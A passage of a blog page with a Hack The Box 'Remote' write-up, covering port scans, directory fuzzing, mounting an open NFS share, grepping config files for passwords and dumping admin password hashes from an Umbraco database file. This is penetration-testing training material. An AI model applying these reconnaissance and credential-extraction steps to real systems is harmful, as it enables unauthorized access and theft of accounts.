@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" href="https://jordangalida.github.io/images/ability_poisons.jpg" />
+<title>HTB Remote Write-up | Jordan&#39;s Blog</title>
+<meta name="title" content="HTB Remote Write-up" />
+<meta name="description" content="A write-up for the Remote box." />
+<meta name="keywords" content="HTB,Pentesting," />
+
+
+<meta property="og:url" content="https://jordangalida.github.io/htb-remote-write-up/">
+  <meta property="og:site_name" content="Jordan&#39;s Blog">
+  <meta property="og:title" content="HTB Remote Write-up">
+  <meta property="og:description" content="A write-up for the Remote box.">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2025-02-05T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-05T00:00:00+00:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Pentesting">
+    <meta property="og:image" content="https://jordangalida.github.io/images/share.png">
+
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://jordangalida.github.io/images/share.png">
+  <meta name="twitter:title" content="HTB Remote Write-up">
+  <meta name="twitter:description" content="A write-up for the Remote box.">
+
+
+
+
+  <meta itemprop="name" content="HTB Remote Write-up">
+  <meta itemprop="description" content="A write-up for the Remote box.">
+  <meta itemprop="datePublished" content="2025-02-05T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-02-05T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1940">
+  <meta itemprop="image" content="https://jordangalida.github.io/images/share.png">
+  <meta itemprop="keywords" content="HTB,Pentesting">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+      --width: 800px;
+      --font-main: "Courier New", monospace;
+      --font-secondary: "Courier New", monospace;
+      --font-scale: 1em;
+      --background-color: #fff;
+      --heading-color: #222;
+      --text-color: #444;
+      --link-color: #32ab60;
+      --visited-color:  #32ab60;
+      --code-background-color: #f2f2f2;
+      --code-color: #222;
+      --blockquote-color: #222;
+      --overflow-wrap: break-word;
+  }
+
+  @media (prefers-color-scheme: dark) {
+      :root {
+          --background-color: #070b0a;
+          --heading-color: #32ab60;
+          --text-color: #32ab60;
+          --link-color: #32ab60;
+          --visited-color:  #32ab60;
+          --code-background-color: #272822;
+          --code-color: #ddd;
+          --blockquote-color: #ccc;
+      }
+  }
+
+  body {
+      font-family: var(--font-secondary);
+      font-size: var(--font-scale);
+      margin: auto;
+      padding: 20px;
+      max-width: var(--width);
+      text-align: left;
+      background-color: var(--background-color);
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+      white-space: normal;
+      line-height: 1.5;
+      color: var(--text-color);
+  }
+
+  h1, h2, h3, h4, h5, h6 {
+      font-family: var(--font-main);
+      color: var(--heading-color);
+  }
+
+  a {
+      color: var(--link-color);
+      cursor: pointer;
+      text-decoration: none;
+  }
+
+  a:hover {
+      text-decoration: underline; 
+  }
+
+  nav a {
+      margin-right: 8px;
+  }
+
+  strong, b {
+      color: var(--heading-color);
+  }
+
+  button {
+      margin: 0;
+      cursor: pointer;
+  }
+
+  main {
+      line-height: 1.6;
+  }
+
+  table {
+      width: 100%;
+  }
+
+  hr {
+      border: 0;
+      border-top: 1px dashed;
+  }
+
+  img {
+      max-width: 100%;
+  }
+
+  pre {
+      white-space: pre-wrap !important;
+      overflow-x: auto !important;
+      word-break: break-all !important;
+      max-width: var(--width) !important;
+      margin: 0 !important;
+  }
+
+  code {
+      font-family: "Courier New", monospace;
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      overflow-wrap: anywhere;
+  }
+
+  blockquote {
+      border-left: 1px solid #999;
+      color: var(--code-color);
+      padding-left: 20px;
+      font-style: italic;
+      text-wrap: wrap;
+  }
+
+  footer {
+      padding: 25px 0;
+      text-align: center;
+  }
+
+  .title:hover {
+      text-decoration: none;
+  }
+
+  .title h1 {
+      font-size: 1.5em;
+  }
+
+  .inline {
+      width: auto !important;
+  }
+
+  .highlight, .code {
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      padding: 5px 10px;
+      word-break: normal;
+      white-space: pre-wrap; 
+      overflow-wrap: anywhere;
+      overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+      list-style-type: none;
+      padding: unset;
+  }
+
+  ul.blog-posts li {
+      display: flex;
+  }
+
+  ul.blog-posts li span {
+      flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+      color: var(--visited-color);
+</style>
+
+</head>
+
+<body>
+  <header><a href="/" class="title">
+  <h2>Jordan&#39;s Blog</h2>
+</a>
+<nav><a href="/">Home</a>
+
+
+<a href="/blog">Blog</a>
+
+</nav>
+</header>
+  <main>
+
+<h1>HTB Remote Write-up</h1>
+<p>
+  <i>
+    <time datetime='2025-02-05'>
+      05 Feb, 2025
+    </time>
+  </i>
+</p>
+
+<content>
+  <p>This was a pretty straight-foward box, however you&rsquo;re going to have to do some Googling to figure out the location where you may find credentials. They are not in the normal expected places. After gaining access to the CMS, you need to again Google version numbers. Checking for public exploits is the first thing I usually do in the real world, but not top on my list for HTB (I should still do this). After exploiting an RCE in the CMS, you gain initial access. You discover that the service account is running the common SeImpersonatePrivilege, which allows you to use the PrintSpoofer exploit to get a shell as SYSTEM.</p>
+<hr>
+<p>As always, we start out with our nmap scans.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap --open 10.10.10.180 -oA remote_top1k
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 11:30 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.180
+</span></span><span style="display:flex;"><span>Host is up (0.029s latency).
+</span></span><span style="display:flex;"><span>Not shown: 993 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>21/tcp   open  ftp
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>111/tcp  open  rpcbind
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>2049/tcp open  nfs
+</span></span></code></pre></div><p>Scanning all ports with scripts enabled and service/version detection.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sC -sV -p- 10.10.10.180 -oA remote_all
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 11:32 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.180
+</span></span><span style="display:flex;"><span>Host is up (0.027s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65519 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp           Microsoft ftpd
+</span></span><span style="display:flex;"><span>|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span></span><span style="display:flex;"><span>| ftp-syst:
+</span></span><span style="display:flex;"><span>|_  SYST: Windows_NT
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span style="display:flex;"><span>|_http-title: Home - Acme Widgets
+</span></span><span style="display:flex;"><span>111/tcp   open  rpcbind       2-4 (RPC #100000)
+</span></span><span style="display:flex;"><span>| rpcinfo:
+</span></span><span style="display:flex;"><span>|   program version    port/proto  service
+</span></span><span style="display:flex;"><span>|   100000  2,3,4        111/tcp   rpcbind
+</span></span><span style="display:flex;"><span>|   100000  2,3,4        111/tcp6  rpcbind
+</span></span><span style="display:flex;"><span>|   100000  2,3,4        111/udp   rpcbind
+</span></span><span style="display:flex;"><span>|   100000  2,3,4        111/udp6  rpcbind
+</span></span><span style="display:flex;"><span>|   100003  2,3         2049/udp   nfs
+</span></span><span style="display:flex;"><span>|   100003  2,3         2049/udp6  nfs
+</span></span><span style="display:flex;"><span>|   100003  2,3,4       2049/tcp   nfs
+</span></span><span style="display:flex;"><span>|   100003  2,3,4       2049/tcp6  nfs
+</span></span><span style="display:flex;"><span>|   100005  1,2,3       2049/tcp   mountd
+</span></span><span style="display:flex;"><span>|   100005  1,2,3       2049/tcp6  mountd
+</span></span><span style="display:flex;"><span>|   100005  1,2,3       2049/udp   mountd
+</span></span><span style="display:flex;"><span>|   100005  1,2,3       2049/udp6  mountd
+</span></span><span style="display:flex;"><span>|   100021  1,2,3,4     2049/tcp   nlockmgr
+</span></span><span style="display:flex;"><span>|   100021  1,2,3,4     2049/tcp6  nlockmgr
+</span></span><span style="display:flex;"><span>|   100021  1,2,3,4     2049/udp   nlockmgr
+</span></span><span style="display:flex;"><span>|   100021  1,2,3,4     2049/udp6  nlockmgr
+</span></span><span style="display:flex;"><span>|   100024  1           2049/tcp   status
+</span></span><span style="display:flex;"><span>|   100024  1           2049/tcp6  status
+</span></span><span style="display:flex;"><span>|   100024  1           2049/udp   status
+</span></span><span style="display:flex;"><span>|_  100024  1           2049/udp6  status
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>2049/tcp  open  nlockmgr      1-4 (RPC #100021)
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49678/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49679/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49680/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: 1h00m03s
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2025-02-05T17:34:28
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3:1:1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 109.21 seconds
+</span></span></code></pre></div><p>Going in order, let&rsquo;s start with FTP. Looks like anonymous login is allowed. Let&rsquo;s see if we can find anything.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span>229 Entering Extended Passive Mode (|||49972|)
+</span></span><span style="display:flex;"><span>125 Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span></code></pre></div><p>Don&rsquo;t see any files. Let&rsquo;s move onto port 80.
+<img src="/images/Remote/website.png" alt="ACME Widgets"></p>
+<p>Navigating through the website we find a login portal?
+<img src="/images/Remote/login.png" alt="Login"></p>
+<p>Let&rsquo;s do some directory fuzzing.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$gobuster dir -u http://10.10.10.180 -w /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>[+] Url:                     http://10.10.10.180
+</span></span><span style="display:flex;"><span>[+] Method:                  GET
+</span></span><span style="display:flex;"><span>[+] Threads:                 10
+</span></span><span style="display:flex;"><span>[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span>[+] Negative Status codes:   404
+</span></span><span style="display:flex;"><span>[+] User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span>[+] Timeout:                 10s
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>/about-us             (Status: 200) [Size: 5441]
+</span></span><span style="display:flex;"><span>/Blog                 (Status: 200) [Size: 5001]
+</span></span><span style="display:flex;"><span>/blog                 (Status: 200) [Size: 5001]
+</span></span><span style="display:flex;"><span>/contact              (Status: 200) [Size: 7880]
+</span></span><span style="display:flex;"><span>/Contact              (Status: 200) [Size: 7880]
+</span></span><span style="display:flex;"><span>/home                 (Status: 200) [Size: 6703]
+</span></span><span style="display:flex;"><span>/Home                 (Status: 200) [Size: 6703]
+</span></span><span style="display:flex;"><span>/install              (Status: 302) [Size: 126] [--&gt; /umbraco/]
+</span></span><span style="display:flex;"><span>/intranet             (Status: 200) [Size: 3323]
+</span></span><span style="display:flex;"><span>/master               (Status: 500) [Size: 3420]
+</span></span><span style="display:flex;"><span>/people               (Status: 200) [Size: 6739]
+</span></span><span style="display:flex;"><span>/People               (Status: 200) [Size: 6739]
+</span></span><span style="display:flex;"><span>/person               (Status: 200) [Size: 2741]
+</span></span><span style="display:flex;"><span>/product              (Status: 500) [Size: 3420]
+</span></span><span style="display:flex;"><span>/products             (Status: 200) [Size: 5328]
+</span></span><span style="display:flex;"><span>/Products             (Status: 200) [Size: 5328]
+</span></span><span style="display:flex;"><span>/umbraco              (Status: 200) [Size: 4040]
+</span></span><span style="display:flex;"><span>Progress: 4614 / 4615 (99.98%)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span></code></pre></div><p>And we find the /install directory which redirects us to /umbraco, which is the login portal we found. Let&rsquo;s check out NFS.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$showmount -e 10.10.10.180
+</span></span><span style="display:flex;"><span>Export list for 10.10.10.180:
+</span></span><span style="display:flex;"><span>/site_backups (everyone)
+</span></span></code></pre></div><p>Let&rsquo;s try to mount it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo mount -t nfs 10.10.10.180:/site_backups ./remote_nfs/ -o nolock
+</span></span><span style="display:flex;"><span>┌─[jsmooth@parrot]─[~/CPTS_Prep/Remote]
+</span></span><span style="display:flex;"><span>└──╼ $cd remote_nfs/
+</span></span><span style="display:flex;"><span>┌─[jsmooth@parrot]─[~/CPTS_Prep/Remote/remote_nfs]
+</span></span><span style="display:flex;"><span>└──╼ $ls
+</span></span><span style="display:flex;"><span>App_Browsers  aspnet_client  css           Media    Umbraco_Client
+</span></span><span style="display:flex;"><span>App_Data      bin            default.aspx  scripts  Views
+</span></span><span style="display:flex;"><span>App_Plugins   Config         Global.asax   Umbraco  Web.config
+</span></span></code></pre></div><p>Nice!. We find a web.config right off the bat. We also find some credentials.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$grep -i password Web.config
+</span></span><span style="display:flex;"><span>                                &lt;network host=&#34;127.0.0.1&#34; userName=&#34;username&#34; password=&#34;password&#34; /&gt;
+</span></span><span style="display:flex;"><span>                                &lt;add name=&#34;UmbracoMembershipProvider&#34; type=&#34;Umbraco.Web.Security.Providers.MembersMembershipProvider, Umbraco&#34; minRequiredNonalphanumericCharacters=&#34;0&#34; minRequiredPasswordLength=&#34;5&#34; useLegacyEncoding=&#34;true&#34; enablePasswordRetrieval=&#34;false&#34; enablePasswordReset=&#34;false&#34; requiresQuestionAndAnswer=&#34;false&#34; defaultMemberTypeAlias=&#34;Member&#34; passwordFormat=&#34;Hashed&#34; allowManuallyChangingPassword=&#34;false&#34; /&gt;
+</span></span></code></pre></div><p>It looks like there are multiple web.configs.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$find . -name <span style="color:#e6db74">&#34;Web.config&#34;</span>
+</span></span><span style="display:flex;"><span>./Media/Web.config
+</span></span><span style="display:flex;"><span>./Umbraco/Install/Views/Web.config
+</span></span><span style="display:flex;"><span>./Umbraco/Xslt/Web.config
+</span></span><span style="display:flex;"><span>./Views/Web.config
+</span></span><span style="display:flex;"><span>./Web.config
+</span></span></code></pre></div><p>Can&rsquo;t really find anything else. Also, the credentials don&rsquo;t seem to be that useful. Let&rsquo;s do some more directory enumeration with another wordlist.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$gobuster dir -u http://10.10.10.180 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>[+] Url:                     http://10.10.10.180
+</span></span><span style="display:flex;"><span>[+] Method:                  GET
+</span></span><span style="display:flex;"><span>[+] Threads:                 10
+</span></span><span style="display:flex;"><span>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+</span></span><span style="display:flex;"><span>[+] Negative Status codes:   404
+</span></span><span style="display:flex;"><span>[+] User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span>[+] Timeout:                 10s
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>/contact              (Status: 200) [Size: 7880]
+</span></span><span style="display:flex;"><span>/blog                 (Status: 200) [Size: 5001]
+</span></span><span style="display:flex;"><span>/home                 (Status: 200) [Size: 6703]
+</span></span><span style="display:flex;"><span>/products             (Status: 200) [Size: 5338]
+</span></span><span style="display:flex;"><span>/people               (Status: 200) [Size: 6749]
+</span></span><span style="display:flex;"><span>/product              (Status: 500) [Size: 3420]
+</span></span><span style="display:flex;"><span>/Home                 (Status: 200) [Size: 6703]
+</span></span><span style="display:flex;"><span>/Products             (Status: 200) [Size: 5338]
+</span></span><span style="display:flex;"><span>/Contact              (Status: 200) [Size: 7890]
+</span></span><span style="display:flex;"><span>/install              (Status: 302) [Size: 126] [--&gt; /umbraco/]
+</span></span><span style="display:flex;"><span>/Blog                 (Status: 200) [Size: 5011]
+</span></span><span style="display:flex;"><span>/about-us             (Status: 200) [Size: 5451]
+</span></span><span style="display:flex;"><span>/People               (Status: 200) [Size: 6749]
+</span></span><span style="display:flex;"><span>/Product              (Status: 500) [Size: 3420]
+</span></span><span style="display:flex;"><span>/INSTALL              (Status: 302) [Size: 126] [--&gt; /umbraco/]
+</span></span><span style="display:flex;"><span>/master               (Status: 500) [Size: 3420]
+</span></span><span style="display:flex;"><span>/1112                 (Status: 200) [Size: 4051]
+</span></span><span style="display:flex;"><span>/intranet             (Status: 200) [Size: 3313]
+</span></span><span style="display:flex;"><span>/1117                 (Status: 200) [Size: 2750]
+</span></span><span style="display:flex;"><span>/1114                 (Status: 200) [Size: 4236]
+</span></span><span style="display:flex;"><span>/person               (Status: 200) [Size: 2741]
+</span></span><span style="display:flex;"><span>/1115                 (Status: 200) [Size: 4132]
+</span></span><span style="display:flex;"><span>/1113                 (Status: 200) [Size: 4271]
+</span></span><span style="display:flex;"><span>/1119                 (Status: 200) [Size: 2749]
+</span></span><span style="display:flex;"><span>/1107                 (Status: 200) [Size: 5328]
+</span></span><span style="display:flex;"><span>/1125                 (Status: 200) [Size: 5001]
+</span></span><span style="display:flex;"><span>/1109                 (Status: 200) [Size: 4039]
+</span></span><span style="display:flex;"><span>/1106                 (Status: 200) [Size: 6693]
+</span></span><span style="display:flex;"><span>/1127                 (Status: 200) [Size: 5813]
+</span></span><span style="display:flex;"><span>/1110                 (Status: 200) [Size: 4176]
+</span></span><span style="display:flex;"><span>/1120                 (Status: 200) [Size: 2751]
+</span></span><span style="display:flex;"><span>/1116                 (Status: 200) [Size: 6739]
+</span></span><span style="display:flex;"><span>/1122                 (Status: 200) [Size: 5441]
+</span></span><span style="display:flex;"><span>/1111                 (Status: 200) [Size: 4196]
+</span></span><span style="display:flex;"><span>/1129                 (Status: 200) [Size: 7880]
+</span></span><span style="display:flex;"><span>/1123                 (Status: 200) [Size: 3632]
+</span></span><span style="display:flex;"><span>/1121                 (Status: 200) [Size: 2750]
+</span></span><span style="display:flex;"><span>/1124                 (Status: 200) [Size: 4723]
+</span></span><span style="display:flex;"><span>/1128                 (Status: 200) [Size: 6879]
+</span></span><span style="display:flex;"><span>/1148                 (Status: 200) [Size: 3313]
+</span></span><span style="display:flex;"><span>/*checkout*           (Status: 400) [Size: 3420]
+</span></span><span style="display:flex;"><span>/1126                 (Status: 200) [Size: 4869]
+</span></span><span style="display:flex;"><span>/1108                 (Status: 200) [Size: 4834]
+</span></span><span style="display:flex;"><span>/1118                 (Status: 200) [Size: 2752]
+</span></span><span style="display:flex;"><span>/Intranet             (Status: 200) [Size: 3313]
+</span></span><span style="display:flex;"><span>/HOME                 (Status: 200) [Size: 6703]
+</span></span><span style="display:flex;"><span>/Install              (Status: 302) [Size: 126] [--&gt; /umbraco/]
+</span></span><span style="display:flex;"><span>/About-Us             (Status: 200) [Size: 5451]
+</span></span><span style="display:flex;"><span>/*docroot*            (Status: 400) [Size: 3420]
+</span></span><span style="display:flex;"><span>/contentpage          (Status: 500) [Size: 3420]
+</span></span><span style="display:flex;"><span>/*                    (Status: 400) [Size: 3420]
+</span></span><span style="display:flex;"><span>/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]
+</span></span><span style="display:flex;"><span>/CONTACT              (Status: 200) [Size: 7880]
+</span></span><span style="display:flex;"><span>/Master               (Status: 500) [Size: 3420]
+</span></span><span style="display:flex;"><span>/q%26a                (Status: 400) [Size: 3420]
+</span></span><span style="display:flex;"><span>/http%3A              (Status: 400) [Size: 3420]
+</span></span><span style="display:flex;"><span>/001106               (Status: 200) [Size: 6693]
+</span></span><span style="display:flex;"><span>/001117               (Status: 200) [Size: 2750]
+</span></span><span style="display:flex;"><span>/001110               (Status: 200) [Size: 4176]
+</span></span><span style="display:flex;"><span>/**http%3a            (Status: 400) [Size: 3420]
+</span></span><span style="display:flex;"><span>/MASTER               (Status: 500) [Size: 3420]
+</span></span><span style="display:flex;"><span>/001109               (Status: 200) [Size: 4039]
+</span></span><span style="display:flex;"><span>/001115               (Status: 200) [Size: 4132]
+</span></span><span style="display:flex;"><span>/001108               (Status: 200) [Size: 4834]
+</span></span><span style="display:flex;"><span>/*http%3A             (Status: 400) [Size: 3420]
+</span></span><span style="display:flex;"><span>/01106                (Status: 200) [Size: 6693]
+</span></span><span style="display:flex;"><span>/PRODUCT              (Status: 500) [Size: 3420]
+</span></span><span style="display:flex;"><span>/01118                (Status: 200) [Size: 2752]
+</span></span><span style="display:flex;"><span>/**http%3A            (Status: 400) [Size: 3420]
+</span></span><span style="display:flex;"><span>/001116               (Status: 200) [Size: 6739]
+</span></span><span style="display:flex;"><span>/001118               (Status: 200) [Size: 2752]
+</span></span><span style="display:flex;"><span>/001119               (Status: 200) [Size: 2749]
+</span></span><span style="display:flex;"><span>/001121               (Status: 200) [Size: 2750]
+</span></span><span style="display:flex;"><span>/001124               (Status: 200) [Size: 4723]
+</span></span><span style="display:flex;"><span>/001123               (Status: 200) [Size: 3632]
+</span></span><span style="display:flex;"><span>/001122               (Status: 200) [Size: 5441]
+</span></span><span style="display:flex;"><span>/001127               (Status: 200) [Size: 5813]
+</span></span><span style="display:flex;"><span>/001126               (Status: 200) [Size: 4869]
+</span></span><span style="display:flex;"><span>/PRODUCTS             (Status: 200) [Size: 5328]
+</span></span><span style="display:flex;"><span>/01119                (Status: 200) [Size: 2749]
+</span></span><span style="display:flex;"><span>/http%3A%2F%2Fyoutube (Status: 400) [Size: 3420]
+</span></span><span style="display:flex;"><span>/http%3A%2F%2Fblogs   (Status: 400) [Size: 3420]
+</span></span><span style="display:flex;"><span>/http%3A%2F%2Fblog    (Status: 400) [Size: 3420]
+</span></span><span style="display:flex;"><span>/001148               (Status: 200) [Size: 3313]
+</span></span><span style="display:flex;"><span>/001112               (Status: 200) [Size: 4051]
+</span></span><span style="display:flex;"><span>/001128               (Status: 200) [Size: 6879]
+</span></span><span style="display:flex;"><span>/001125               (Status: 200) [Size: 5001]
+</span></span><span style="display:flex;"><span>/ContentPage          (Status: 500) [Size: 3420]
+</span></span><span style="display:flex;"><span>/**http%3A%2F%2Fwww   (Status: 400) [Size: 3420]
+</span></span><span style="display:flex;"><span>Progress: 87664 / 87665 (100.00%)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span></code></pre></div><p>Just a bunch of random numbers which seem to correspond to the pages we&rsquo;ve already discovered. The only really solid thing we have found so far is the NFS share. An open NFS share with all of those files definitely has something in it. We should go back and look deeper. Let&rsquo;s Google where Umbraco credentials are stored since we know Umbraco is being used and we see Umbraco files in the share. <a href="https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials">This post</a> mentions the Umbraco.sdf file inside the App_Data folder.</p>
+<p>It isn&rsquo;t in a nice format, so we just do a strings on the file and we find some password hashes for the admin and ssmith accounts.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$strings Umbraco.sdf
+</span></span><span style="display:flex;"><span>Administratoradmindefaulten-US
+</span></span><span style="display:flex;"><span>Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
+</span></span><span style="display:flex;"><span>Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&#34;hashAlgorithm&#34;:&#34;SHA1&#34;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
+</span></span><span style="display:flex;"><span>adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&#34;hashAlgorithm&#34;:&#34;SHA1&#34;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
+</span></span><span style="display:flex;"><span>adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&#34;hashAlgorithm&#34;:&#34;SHA1&#34;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
+</span></span><span style="display:flex;"><span>smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&#34;hashAlgorithm&#34;:&#34;HMACSHA256&#34;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
+</span></span><span style="display:flex;"><span>ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&#34;hashAlgorithm&#34;:&#34;HMACSHA256&#34;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
